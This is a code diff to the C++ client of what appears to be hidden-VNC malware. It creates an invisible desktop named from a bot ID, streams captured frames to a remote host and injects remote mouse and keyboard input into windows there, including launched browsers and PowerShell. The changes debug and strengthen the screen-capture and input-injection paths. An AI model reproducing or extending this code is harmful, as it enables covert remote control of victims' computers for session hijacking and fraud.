@@ -22,6 +22,8 @@ struct InputMessage
 static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans = RGB(255, 174, 201);
 static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
+static const DWORD    gc_frameIntervalMs = 33;
+static const DWORD    gc_socketTimeoutMs = 5000;
 
 enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
 
@@ -36,9 +38,96 @@ static BITMAPINFO g_bmpInfo;
 static HANDLE     g_hInputThread, g_hDesktopThread;
 static ULONG_PTR  g_gdiplusToken;
 static BOOL       g_gdiplusStarted = FALSE;
+static BOOL       g_lastCaptureFailed = FALSE;
 static char       g_desktopName[MAX_PATH];
+static HWND       g_lastInputHwnd = NULL;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
+
+static const char *InputMsgName(UINT msg)
+{
+    switch (msg)
+    {
+    case WM_LBUTTONDOWN: return "WM_LBUTTONDOWN";
+    case WM_LBUTTONUP: return "WM_LBUTTONUP";
+    case WM_RBUTTONDOWN: return "WM_RBUTTONDOWN";
+    case WM_RBUTTONUP: return "WM_RBUTTONUP";
+    case WM_MBUTTONDOWN: return "WM_MBUTTONDOWN";
+    case WM_MBUTTONUP: return "WM_MBUTTONUP";
+    case WM_LBUTTONDBLCLK: return "WM_LBUTTONDBLCLK";
+    case WM_RBUTTONDBLCLK: return "WM_RBUTTONDBLCLK";
+    case WM_MBUTTONDBLCLK: return "WM_MBUTTONDBLCLK";
+    case WM_MOUSEMOVE: return "WM_MOUSEMOVE";
+    case WM_MOUSEWHEEL: return "WM_MOUSEWHEEL";
+    case WM_CHAR: return "WM_CHAR";
+    case WM_KEYDOWN: return "WM_KEYDOWN";
+    case WM_KEYUP: return "WM_KEYUP";
+    case WM_SYSCHAR: return "WM_SYSCHAR";
+    case WM_SYSKEYDOWN: return "WM_SYSKEYDOWN";
+    case WM_SYSKEYUP: return "WM_SYSKEYUP";
+    default: return "UNKNOWN";
+    }
+}
+
+static HWND GetTopLevelWindow(HWND hWnd)
+{
+    if (!hWnd)
+        return NULL;
+
+    HWND topHwnd = hWnd;
+    while ((GetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
+    {
+        HWND parent = GetParent(topHwnd);
+        if (!parent)
+            break;
+        topHwnd = parent;
+    }
+    return topHwnd;
+}
+
+static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *title, int titleSize)
+{
+    if (classNameSize > 0)
+        className[0] = 0;
+    if (titleSize > 0)
+        title[0] = 0;
+
+    if (!hWnd)
+        return;
+
+    GetClassNameA(hWnd, className, classNameSize);
+    GetWindowTextA(hWnd, title, titleSize);
+}
+
+static BOOL ShouldLogInput(UINT msg)
+{
+    static DWORD moveCount = 0;
+    if (msg == WM_MOUSEMOVE)
+    {
+        ++moveCount;
+        return (moveCount % 60) == 1;
+    }
+    return TRUE;
+}
+
+static void LogInputTarget(const char *stage, UINT msg, HWND hWnd, POINT screenPoint, POINT clientPoint, BOOL result)
+{
+    char className[128];
+    char title[128];
+    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+    printf("[input] %s %s hwnd=0x%p class='%s' title='%s' screen=(%ld,%ld) client=(%ld,%ld) result=%s lastError=%lu\n",
+        stage,
+        InputMsgName(msg),
+        hWnd,
+        className,
+        title,
+        screenPoint.x,
+        screenPoint.y,
+        clientPoint.x,
+        clientPoint.y,
+        result ? "ok" : "failed",
+        GetLastError());
+}
 
 static void FreePixelBuffers()
 {
@@ -193,6 +282,11 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
     HWND hWndDesktop = Funcs::pGetDesktopWindow();
     Funcs::pGetWindowRect(hWndDesktop, &rect);
 
+    g_lastCaptureFailed = FALSE;
+
+    if (serverWidth <= 0 || serverHeight <= 0 || rect.right <= 0 || rect.bottom <= 0)
+        goto cleanup;
+
     hDc = Funcs::pGetDC(NULL);
     if (!hDc)
         goto cleanup;
@@ -276,10 +370,9 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
     Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
     hOldBmpScreen = NULL;
 
-    if (BitmapToJpg(hDcScreen, hBmpScreen, serverHeight))
-        captureSuccess = TRUE;
-    // Fall back to raw pixels if GDI+ JPEG encoding fails
-    else if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
+    // Use raw pixels directly. The previous JPEG round-trip was very expensive and
+    // caused visible input lag before the frame was compressed for transport.
+    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
         captureSuccess = TRUE;
 
 cleanup:
@@ -303,6 +396,7 @@ cleanup:
     {
         g_bmpInfo.bmiHeader.biWidth = 0;
         g_bmpInfo.bmiHeader.biHeight = 0;
+        g_lastCaptureFailed = TRUE;
         // Treat a failed capture as an unchanged frame so the caller skips it
         return TRUE;
     }
@@ -351,22 +445,47 @@ static SOCKET ConnectServer()
     SOCKET      s;
     SOCKADDR_IN addr;
 
+    printf("[diag] Connecting to server %s:%d\n", g_host, g_port);
+
     if (Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    {
+        printf("[!] WSAStartup failed\n");
         return NULL;
+    }
     if ((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+    {
+        printf("[!] socket() failed\n");
         return NULL;
+    }
 
     hostent *he = Funcs::pGethostbyname(g_host);
+    if (!he || !he->h_addr_list || !he->h_addr_list[0])
+    {
+        printf("[!] Failed to resolve host: %s\n", g_host);
+        Funcs::pClosesocket(s);
+        return NULL;
+    }
+
+    Funcs::pMemset(&addr, 0, sizeof(addr));
     Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
     addr.sin_family = AF_INET;
     addr.sin_port = Funcs::pHtons(g_port);
 
     if (Funcs::pConnect(s, (sockaddr *)&addr, sizeof(addr)) < 0)
+    {
+        printf("[!] connect() failed for %s:%d\n", g_host, g_port);
+        Funcs::pClosesocket(s);
         return NULL;
+    }
 
     int one = 1;
     Funcs::pSetsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&one, sizeof(one));
+    DWORD timeout = gc_socketTimeoutMs;
+    // Keep receive operations blocking. The input channel may be idle until the
+    // user clicks or types, but sends should not block forever on a stalled peer.
+    Funcs::pSetsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));
 
+    printf("[+] Connected to server %s:%d\n", g_host, g_port);
     return s;
 }
 
@@ -414,8 +533,17 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     SOCKET s = ConnectServer();
     BYTE *workSpace = NULL;
 
-    if (!Funcs::pSetThreadDesktop(g_hDesk))
+    if (!s)
+    {
+        printf("[!] Desktop channel could not connect (session %lu)\n", sessionId);
         goto exit;
+    }
+
+    if (!Funcs::pSetThreadDesktop(g_hDesk))
+    {
+        printf("[!] Desktop channel SetThreadDesktop failed (session %lu)\n", sessionId);
+        goto exit;
+    }
 
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
         goto exit;
@@ -424,17 +552,29 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     if (!SendInt(s, (int)sessionId))
         goto exit;
 
+    printf("[+] Desktop channel handshake sent (session %lu)\n", sessionId);
+
     {
         DWORD workSpaceSize;
         DWORD fragmentWorkSpaceSize;
         NTSTATUS status = Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
         if (status < 0)
+        {
+            printf("[!] RtlGetCompressionWorkSpaceSize failed: status=0x%08lx\n", status);
             goto exit;
+        }
         workSpace = (BYTE *)Alloc(workSpaceSize);
         if (!workSpace)
+        {
+            printf("[!] Compression workspace allocation failed (%lu bytes)\n", workSpaceSize);
             goto exit;
+        }
+        printf("[diag] Compression workspace allocated: %lu bytes\n", workSpaceSize);
     }
 
+    BOOL firstFrameLogged = FALSE;
+    BOOL noFrameLogged = FALSE;
+    BOOL captureFailureLogged = FALSE;
     for (;;)
     {
         int width, height;
@@ -447,6 +587,17 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         BOOL same = GetDeskPixels(width, height);
         if (same)
         {
+            if (g_lastCaptureFailed && !captureFailureLogged)
+            {
+                printf("[!] Desktop capture failed; no frame will be sent until capture succeeds\n");
+                captureFailureLogged = TRUE;
+            }
+            else if (!g_lastCaptureFailed && !noFrameLogged)
+            {
+                printf("[diag] No changed desktop pixels yet; hidden desktop may be empty\n");
+                noFrameLogged = TRUE;
+            }
+
             if (!SendInt(s, 0))
                 goto exit;
             continue;
@@ -483,14 +634,31 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         if (!SendAll(s, g_tempPixels, (int)size))
             goto exit;
 
+        if (!firstFrameLogged)
+        {
+            printf("[+] First desktop frame sent: remote=%ldx%ld, frame=%ldx%ld, compressed=%lu bytes\n",
+                rect.right,
+                rect.bottom,
+                g_bmpInfo.bmiHeader.biWidth,
+                g_bmpInfo.bmiHeader.biHeight,
+                size);
+            firstFrameLogged = TRUE;
+        }
+
         int response;
         if (!RecvInt(s, &response))
             goto exit;
+
+        Funcs::pSleep(gc_frameIntervalMs);
     }
 
 exit:
+    printf("[!] Desktop thread exiting (session %lu)\n", sessionId);
     Funcs::pFree(workSpace);
-    Funcs::pTerminateThread(g_hInputThread, 0);
+    if (s)
+        Funcs::pClosesocket(s);
+    if (g_hInputThread)
+        Funcs::pTerminateThread(g_hInputThread, 0);
     return 0;
 }
 
@@ -690,18 +858,44 @@ static DWORD WINAPI InputThread(LPVOID param)
 {
     SOCKET s = ConnectServer();
 
-    Funcs::pSetThreadDesktop(g_hDesk);
+    if (!s)
+    {
+        printf("[!] Input channel could not connect\n");
+        return 0;
+    }
+
+    if (Funcs::pSetThreadDesktop(g_hDesk))
+        printf("[diag] Input thread attached to desktop: %s\n", g_desktopName);
+    else
+        printf("[!] Input thread SetThreadDesktop failed\n");
 
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
-        return 0;
+    {
+        printf("[!] Failed to send input channel magic\n");
+        goto exit;
+    }
     if (!SendInt(s, Connection::input))
-        return 0;
+    {
+        printf("[!] Failed to send input channel id\n");
+        goto exit;
+    }
+
+    printf("[+] Input channel handshake sent\n");
 
     int sessionId;
     if (!RecvInt(s, &sessionId) || !sessionId)
-        return 0;
+    {
+        printf("[!] Failed to receive session id from server\n");
+        goto exit;
+    }
+
+    printf("[+] Input channel ready; session id=%d\n", sessionId);
 
     g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
+    if (g_hDesktopThread)
+        printf("[diag] Desktop thread created\n");
+    else
+        printf("[!] Desktop thread creation failed\n");
 
     POINT      lastPoint;
     BOOL       lmouseDown = FALSE;
@@ -817,9 +1011,18 @@ static DWORD WINAPI InputThread(LPVOID param)
         case WM_CHAR:
         case WM_KEYDOWN:
         case WM_KEYUP:
+        case WM_SYSCHAR:
+        case WM_SYSKEYDOWN:
+        case WM_SYSKEYUP:
         {
             point = lastPoint;
-            hWnd = Funcs::pWindowFromPoint(point);
+            hWnd = GetFocus();
+            if (!hWnd)
+                hWnd = GetForegroundWindow();
+            if (!hWnd)
+                hWnd = g_lastInputHwnd;
+            if (!hWnd)
+                hWnd = Funcs::pWindowFromPoint(point);
             break;
         }
         default:
@@ -831,6 +1034,14 @@ static DWORD WINAPI InputThread(LPVOID param)
             lastPoint = point;
 
             hWnd = Funcs::pWindowFromPoint(point);
+            if (!hWnd)
+            {
+                POINT emptyPoint = { 0, 0 };
+                if (ShouldLogInput(msg))
+                    LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
+                continue;
+            }
+
             if (msg == WM_LBUTTONUP)
             {
                 lmouseDown = FALSE;
@@ -873,13 +1084,37 @@ static DWORD WINAPI InputThread(LPVOID param)
             {
                 lmouseDown = TRUE;
                 hResMoveWindow = NULL;
+                g_lastInputHwnd = hWnd;
+
+                HWND topFocusHwnd = GetTopLevelWindow(hWnd);
+                BOOL bringResult = topFocusHwnd ? BringWindowToTop(topFocusHwnd) : FALSE;
+                BOOL foregroundResult = topFocusHwnd ? SetForegroundWindow(topFocusHwnd) : FALSE;
+                HWND activeResult = topFocusHwnd ? SetActiveWindow(topFocusHwnd) : NULL;
+                HWND focusResult = SetFocus(hWnd);
+                if (ShouldLogInput(msg))
+                {
+                    char className[128];
+                    char title[128];
+                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                    printf("[input] focus WM_LBUTTONDOWN target=0x%p top=0x%p class='%s' title='%s' bring=%d foreground=%d active=0x%p focus=0x%p lastError=%lu\n",
+                        hWnd,
+                        topFocusHwnd,
+                        className,
+                        title,
+                        bringResult,
+                        foregroundResult,
+                        activeResult,
+                        focusResult,
+                        GetLastError());
+                }
 
                 RECT startButtonRect;
                 HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
-                Funcs::pGetWindowRect(hStartButton, &startButtonRect);
-                if (Funcs::pPtInRect(&startButtonRect, point))
+                if (hStartButton && Funcs::pGetWindowRect(hStartButton, &startButtonRect) && Funcs::pPtInRect(&startButtonRect, point))
                 {
-                    Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
+                    BOOL posted = Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
+                    if (ShouldLogInput(msg))
+                        LogInputTarget("start-button", msg, hStartButton, point, point, posted);
                     continue;
                 }
                 else
@@ -996,36 +1231,77 @@ static DWORD WINAPI InputThread(LPVOID param)
         }
 
         POINT screenPoint = point;
+        POINT clientPt = { 0, 0 };
 
-        for (HWND currHwnd = hWnd;;)
+        if (!hWnd)
         {
-            hWnd = currHwnd;
-            Funcs::pScreenToClient(currHwnd, &point);
-            currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
-            if (!currHwnd || currHwnd == hWnd)
-                break;
+            if (ShouldLogInput(msg))
+                LogInputTarget("drop-no-target", msg, NULL, screenPoint, clientPt, FALSE);
+            continue;
         }
 
-        if (msg != WM_MOUSEMOVE)
+        if (mouseMsg)
         {
-            while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
-                   (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
+            for (HWND currHwnd = hWnd;;)
             {
-                HWND parent = Funcs::pGetParent(hWnd);
-                if (!parent)
+                hWnd = currHwnd;
+                Funcs::pScreenToClient(currHwnd, &point);
+                currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
+                if (!currHwnd || currHwnd == hWnd)
                     break;
-                hWnd = parent;
+            }
+
+            if (msg != WM_MOUSEMOVE)
+            {
+                while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
+                    (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
+                {
+                    HWND parent = Funcs::pGetParent(hWnd);
+                    if (!parent)
+                        break;
+                    hWnd = parent;
+                }
+            }
+
+            clientPt = screenPoint;
+            Funcs::pScreenToClient(hWnd, &clientPt);
+            if (msg != WM_MOUSEWHEEL)
+                lParam = MAKELPARAM(clientPt.x, clientPt.y);
+            g_lastInputHwnd = hWnd;
+
+            if (msg == WM_LBUTTONDOWN)
+            {
+                HWND finalFocusResult = SetFocus(hWnd);
+                if (ShouldLogInput(msg))
+                {
+                    char className[128];
+                    char title[128];
+                    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                    printf("[input] final-focus WM_LBUTTONDOWN hwnd=0x%p class='%s' title='%s' focus=0x%p lastError=%lu\n",
+                        hWnd,
+                        className,
+                        title,
+                        finalFocusResult,
+                        GetLastError());
+                }
             }
         }
-        POINT clientPt = screenPoint;
-        Funcs::pScreenToClient(hWnd, &clientPt);
-        if (mouseMsg)
-            lParam = MAKELPARAM(clientPt.x, clientPt.y);
+        else
+        {
+            clientPt = screenPoint;
+        }
 
-        Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
+        SetLastError(0);
+        BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
+        if (ShouldLogInput(msg))
+            LogInputTarget("post", msg, hWnd, screenPoint, clientPt, posted);
     }
 exit:
-    Funcs::pTerminateThread(g_hDesktopThread, 0);
+    printf("[!] Input thread exiting\n");
+    if (s)
+        Funcs::pClosesocket(s);
+    if (g_hDesktopThread)
+        Funcs::pTerminateThread(g_hDesktopThread, 0);
     return 0;
 }
 
@@ -1033,6 +1309,7 @@ static DWORD WINAPI MainThread(LPVOID param)
 {
     Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
     GetBotId(g_desktopName);
+    printf("[diag] Hidden desktop name: %s\n", g_desktopName);
 
     Funcs::pMemset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
     g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
@@ -1044,13 +1321,33 @@ static DWORD WINAPI MainThread(LPVOID param)
     GdiplusStartupInput gdiplusStartupInput;
     if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Ok)
         g_gdiplusStarted = TRUE;
+    printf("[diag] GDI+ startup: %s\n", g_gdiplusStarted ? "ok" : "failed");
 
     g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
     if (!g_hDesk)
+    {
+        printf("[diag] OpenDesktop failed; creating hidden desktop\n");
         g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
-    Funcs::pSetThreadDesktop(g_hDesk);
+    }
+    else
+        printf("[diag] OpenDesktop succeeded\n");
+
+    if (!g_hDesk)
+        printf("[!] CreateDesktop/OpenDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());
+    else
+        printf("[+] Hidden desktop ready: handle=0x%p\n", g_hDesk);
+
+    if (g_hDesk && Funcs::pSetThreadDesktop(g_hDesk))
+        printf("[diag] Main thread attached to hidden desktop\n");
+    else
+        printf("[!] Main thread SetThreadDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());
 
     g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
+    if (g_hInputThread)
+        printf("[diag] Input thread created\n");
+    else
+        printf("[!] Input thread creation failed: GetLastError=%lu\n", Funcs::pGetLastError());
+
     if (g_hInputThread)
         Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
     if (g_hDesktopThread)
@@ -1072,6 +1369,7 @@ static DWORD WINAPI MainThread(LPVOID param)
     g_hInputThread = NULL;
     g_hDesktopThread = NULL;
     g_started = FALSE;
+    printf("[diag] Main thread cleanup complete\n");
     return 0;
 }
 
@@ -1081,6 +1379,9 @@ HANDLE StartHHHH(const char *host, int port)
         return NULL;
     Funcs::pLstrcpyA(g_host, host);
     g_port = port;
+    printf("[diag] StartHHHH requested for %s:%d\n", g_host, g_port);
     g_started = TRUE;
-    return Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
+    HANDLE hThread = Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
+    printf("[diag] Main thread handle: 0x%p\n", hThread);
+    return hThread;
 }
